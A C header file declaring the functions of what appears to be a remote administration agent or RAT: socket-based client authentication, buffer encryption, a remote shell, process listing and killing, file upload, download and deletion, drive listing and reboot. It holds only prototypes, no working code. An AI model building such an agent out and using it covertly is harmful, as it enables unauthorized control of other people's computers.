#pragma once

int AuthClient(char *recv_buf);
void decrypt(unsigned char* recv_buf, size_t recv_buf_size);
void encrypt(unsigned char* recv_buf, size_t recv_buf_size);
void HandleLspid(char *cmd, int client_socket);
void HandleShell(char *cmd,int client_socket);
void HandleStopProcess(char *cmd, int client_socket);
int UploadFile(char *cmd ,int client_socket, char * filename,  char * FullWindowsPath);
int DownloadFile(char *cmd, int client_socket, char * filename , char * SavePath);
int HandleDelete(char *cmd, int client_socket, char * filename);
void HandleListDrives(char *cmd , int client_socket);
void HandleGetFileDate(char *cmd , int client_socket, char * filename);
int HandleReboot(char *cmd , int client_socket);
